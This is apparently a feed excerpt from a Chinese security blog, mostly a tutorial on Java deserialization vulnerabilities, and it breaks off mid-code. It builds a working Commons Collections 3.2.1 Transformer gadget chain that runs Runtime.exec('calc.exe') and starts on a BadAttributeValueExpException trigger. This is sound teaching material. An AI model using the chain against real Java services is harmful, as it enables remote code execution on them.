found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">Pwn基础知识笔记</a></p><p><a href="https://blog.csdn.net/axiejundong/article/details/73065023?utm_source=blogxgwz8" target="_blank" rel="noopener">软件常用安全防护手段 checksec 总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里主要介绍一下Linux下ELF文件的一些安全防御机制及其原理，其在二进制安全和Pwn上经常会碰到，至于各个类型的绕过技巧后面会补充。&lt;/p&gt;
&lt;h2 id=&quot;NX（DEP）&quot;&gt;&lt;a href=&quot;#NX（DEP）&quot; class=&quot;headerlink&quot; title=&quot;NX
      
    
    </summary>
    
      <category term="二进制基础" scheme="https://Mi1k7ea.github.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞</title>
    <link href="https://Mi1k7ea.github.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://Mi1k7ea.github.com/2019/02/06/Java反序列化漏洞/</id>
    <published>2019-02-06T04:14:03.000Z</published>
    <updated>2019-02-18T15:15:07.532Z</updated>
    
    <content type="html"><![CDATA[<p>在学习Java反序列化漏洞之前，建议先熟悉<a href="https://mi1k7ea.github.io/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">Java序列化和反序列化机制</a>。</p><p>在反序列化漏洞中，Java类反序列化漏洞较PHP和Python的相比，显得稍微复杂一些。主要是要求对Java较为熟悉。下面小结一下Java反序列化漏洞的相关内容。</p><h2 id="何为Java反序列化漏洞"><a href="#何为Java反序列化漏洞" class="headerlink" title="何为Java反序列化漏洞"></a>何为Java反序列化漏洞</h2><p>当开发者自定义实现Serializable、添加自己的readObject()方法时，若readObject()方法内代码逻辑存在缺陷，则可能存在Java反序列化漏洞的风险。如果此时Java服务的反序列化API允许外部用户使用，则会导致攻击者使用精心构造的payload来利用反序列化漏洞达到任意代码执行的目的。</p><p>Java反序列化中readObject()方法的作用相当于PHP反序列化中的魔术函数，使反序列化过程在一定程度上受控成为可能，是否真的可控，还需分析每个对象的readObject()方法具体是如何实现的。通常情况下，在Java的readObject()方法中很少会像CTF中PHP的反序列化漏洞题目一样直接将漏洞代码写在该方法中，这时就需要去构造反射链来进行任意代码执行。</p><h2 id="重写readObject-示例"><a href="#重写readObject-示例" class="headerlink" title="重写readObject()示例"></a>重写readObject()示例</h2><p>Java反序列化漏洞的根源在于重写readObject()方法导致存在漏洞代码。</p><p>readObject()方法重写的格式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p>注意，readObject()方法被定义成了private，并且是必须尝试捕获IOException和ClassNotFoundException的异常。</p><p>这里再贴另外一个简单的示例，创建一个不安全的类对象，赋值其name属性并序列化为文件保存起来，接着通过反序列化该文件获取该对象及其属性值，通过重写readObject()方法在调用默认的readObject()方法之后添加一条执行计算器的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        UnsafeClass Unsafe = <span class="keyword">new</span> UnsafeClass();</span><br><span class="line">        Unsafe.name = <span class="string">"Mi1k7ea"</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"[*]序列化对象"</span>);</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(Unsafe);</span><br><span class="line">        os.close();</span><br><span class="line">        fos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"[*]反序列化文件中保存的序列化对象"</span>);</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnsafeClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在readObject()方法调用时Java的序列化机制会先寻找用户是否自定义了readObject()方法，若有则直接调用该自定义的方法而非默认的readObject()方法：</p><p><img src="/2019/02/06/Java反序列化漏洞/1.png" alt="重写readObject()方法"></p><h2 id="Apache-Commons-Collections反序列化漏洞分析"><a href="#Apache-Commons-Collections反序列化漏洞分析" class="headerlink" title="Apache Commons Collections反序列化漏洞分析"></a>Apache Commons Collections反序列化漏洞分析</h2><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，包含了很多jar工具包，提供了很多强有力的数据结构类型并且实现了各种集合工具类。</p><p>org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为set、list、queue等等，它们是集合类型。换一种理解方式，collection是set、list、queue的抽象。</p><p>作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发，而正是因为在大量web应用程序中这些类的实现以及方法的调用，导致了反序列化用漏洞的普遍性和严重性。</p><p>影响版本：3.2.1及以下版本的Commons Collections包。</p><p>下面就简单地模拟该序列化漏洞产生、payload的构造及利用过程。这里示例用的commons-collections-3.2.1.jar包。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>Apache Commons Collections中有一个特殊的接口Transformer，其中有一个实现该接口的类InvokerTransformer可以通过调用Java的反射机制来调用任意函数，其源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (methodName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"The method to invoke must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InvokerTransformer(methodName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (methodName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"The method to invoke must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paramTypes == <span class="keyword">null</span> &amp;&amp; args != <span class="keyword">null</span> || paramTypes != <span class="keyword">null</span> &amp;&amp; args == <span class="keyword">null</span> || paramTypes != <span class="keyword">null</span> &amp;&amp; args != <span class="keyword">null</span> &amp;&amp; paramTypes.length != args.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"The parameter types must match the arguments"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paramTypes != <span class="keyword">null</span> &amp;&amp; paramTypes.length != <span class="number">0</span>) &#123;</span><br><span class="line">            paramTypes = (Class[])((Class[])paramTypes.clone());</span><br><span class="line">            args = (Object[])((Object[])args.clone());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InvokerTransformer(methodName, paramTypes, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InvokerTransformer(methodName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到该InvokerTransformer类是实现Transformer接口的（Transformer接口主要用于转换并返回一个给定的Object对象），且其中的transform()方法采用反射机制进行任意函数调用，这就是漏洞点所在。</p><p>这里是反射机制关键的三句代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class cls = input.getClass();</span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>第一句：input为Object对象，获取其对应的Class；</p><p>第二句：获取cls类中具体的方法对象；</p><p>第三句：执行input对象的method方法，返回同method一样的返回类型。</p><p>上述三句代码其实等同于下面的代码，即可以直接合并起来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input.getClass().getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes).invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>下面编写代码进行弹出计算器的测试来验证该漏洞点是否能利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC_Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer it = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>&#125;);</span><br><span class="line">        it.transform(java.lang.Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/02/06/Java反序列化漏洞/4.png" alt="demo"></p><p>可以看到是可以弹出计算器的，即可以进行漏洞利用，但是有个问题，就是我们不能从外部直接传入java.lang.Runtime.getRuntime()，这时就需要我们去构造链式结构的payload来实现漏洞利用。</p><p>下面就开始构造反射链payload来实现反序列化漏洞的利用。</p><h3 id="1、通过反射构造可序列化的恶意反射链对象"><a href="#1、通过反射构造可序列化的恶意反射链对象" class="headerlink" title="1、通过反射构造可序列化的恶意反射链对象"></a>1、通过反射构造可序列化的恶意反射链对象</h3><p>一步步来，我们知道，要让Java程序执行执行命令，通常是获取到<code>Runtime</code>的实例，再调用它的<code>exec()</code>执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">runtime.exec(cmd);</span><br></pre></td></tr></table></figure><p>接着将其表示为链式结构的形式，因为底层通过反射技术获取对象调用函数都会存在一个上下文环境，使用链式结构的语句可以保证执行过程中这个上下文是一致的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure><p>好了，我们知道构造的反射链是这种格式，下面开始分析Commons Collections的payload的链式结构。</p><p>Commons Collections中有一个用于对象之间转换的Transformer接口，先看构造的链式结构payload中涉及到的几个实现类，只需看其构造方法和transform()方法即可。</p><p>1、ConstantTransformer类，是一个Transformer接口实现类，其构造方法和transform()方法如下，可看到transform()方法会原封不动地返回传入的Object，从而可构造外部输入的常量如Runtime.class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、InvokerTransformer类，在漏洞点中已说明。</p><p>3、ChainedTransformer类，是一个Transformer接口实现类，其构造方法和transform()方法如下，其transform()方法用于链接多个步骤构造的transformer，其中object参数为上一次调用transform()的返回结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着看下面这段构造的payload链式结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>,&#125;),</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure><p>构造过程如下：</p><ol><li>构造一个ConstantTransformer对象，把Runtime的Class对象传进去，在transform()时，始终会返回这个对象；</li><li>构造一个InvokerTransformer对象，待调用方法名为getMethod，参数为getRuntime，在transform()时，传入第一步的结果，此时的input应该是java.lang.Runtime，但经过getClass()之后，cls为java.lang.Class，之后getMethod()只能获取java.lang.Class的方法，因此才会定义的待调用方法名为getMethod，然后其参数才是getRuntime，它得到的是getMethod这个方法的Method对象，invoke()调用这个方法，最终得到的才是getRuntime这个方法的Method对象；</li><li>构造一个InvokerTransformer对象，待调用方法名为invoke，参数为空，在transform()时，传入第二步的结果，同理，cls将会是java.lang.reflect.Method，再获取并调用它的invoke()方法，实际上是调用上面的getRuntime()拿到Runtime对象；</li><li>构造一个InvokerTransformer对象，待调用方法名为exec，参数为命令字符串，在transform()时，传入第三步的结果，获取java.lang.Runtime的exec方法并传参调用；</li><li>最后把它们组装成一个数组全部放进ChainedTransformer中，在transform()时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求。</li></ol><p>有一个问题——上面的第2、3步是不是可以简化一下，考虑用下面这种逻辑更清晰的方式来构造呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[] &#123; cmd &#125;)&#125;;</span><br></pre></td></tr></table></figure><p>答案是不行的。虽然单看整个链，无论是定义还是执行都是没有任何问题的，但是在后续序列化时，由于Runtime.getRuntime()得到的是一个对象，这个对象也需要参与序列化过程，而Runtime本身是没有实现Serializable接口的，所以会导致序列化失败。</p><p>构造完这条Transformer链，就等着谁来执行它的transform()了。</p><p>这里可以先直接在代码下面添加<code>transformerChain.transform(null);</code>语句来查看该Transformer链是否真的可以执行命令且该对象是否可以被序列化，代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>,&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试我们的恶意对象是否可以被序列化</span></span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行以下语句就可以调用起计算器</span></span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行之后程序没报错，即该Transformer链可以进行序列化，并且在执行<code>transformerChain.transform(null);</code>时成功弹出计算器：</p><p><img src="/2019/02/06/Java反序列化漏洞/2.png" alt="payload1"></p><p>该Transformer链没有问题，下面就是找Commons Collections中哪些地方可以执行该Transformer链的transform()方法以及寻找含有自定义有漏洞的readObject()方法的类了。</p><h3 id="2、查找自定义readObject-方法且存在漏洞代码的类"><a href="#2、查找自定义readObject-方法且存在漏洞代码的类" class="headerlink" title="2、查找自定义readObject()方法且存在漏洞代码的类"></a>2、查找自定义readObject()方法且存在漏洞代码的类</h3><p>如网上所说，在JDK较早的版本中存在AnnotationInvocationHandler类 ，其类对象在初始化时可以传入一个Map类型参数赋值给字段memberValues，readObject()过程中如果满足一定条件就会对memberValues中的元素进行setValue()。</p><p>但是，在较新版本的JDK中AnnotationInvocationHandler没有了setValue()方法，但是可以使用BadAttributeValueExpException类来实现。由于本地环境的JDK为较新的版本，因此就只暂时对BadAttributeValueExpException类进行分析。</p><p><strong>BadAttributeValueExpException</strong></p><p>下面看下BadAttributeValueExpException类定义，可以看到定义了一个名为val的对象类型属性，且自定义了readObject()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 